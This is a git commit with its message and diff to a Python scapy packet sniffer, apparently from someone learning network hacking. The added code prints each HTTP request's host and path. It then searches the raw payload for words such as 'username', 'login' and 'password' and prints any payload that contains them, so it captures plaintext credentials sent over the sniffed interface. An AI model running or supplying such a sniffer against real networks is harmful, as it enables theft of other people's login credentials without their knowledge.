43f7674ef74d20de19eeebedd015f50120a7c520
ktravnik <krystof.travnik@gmail.com>
2021-04-21 15:14:15 -0400

    url printing of current host is printed and also list of keywords which are we looking for are iterated if any is found then its printed and loop is exited

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -13,13 +13,22 @@ def sniff(interface):
 
 # function which will check if there is a HTTP Request in it, if yes it will
 # also check RAW layer which was shown by packet.show and its the layer which contain username and password information
-# if this condition is also met it will be printed. Its ising scapy.layers
+# if this condition is also met it will be printed. Its using scapy layers.
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
+        # url will be saved in url and then it will be printed so you can see url + later credentials
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print url
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
-            # print(packet.show())
+            load = packet[scapy.Raw].load
+            # list keywords which will be go through words which can contain interesting stuff and then it will be printed
+            keywords = ["username", "user", "login", "password", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    # break which will end the loop if any words was found
+                    break
 
 
 sniff("eth0")
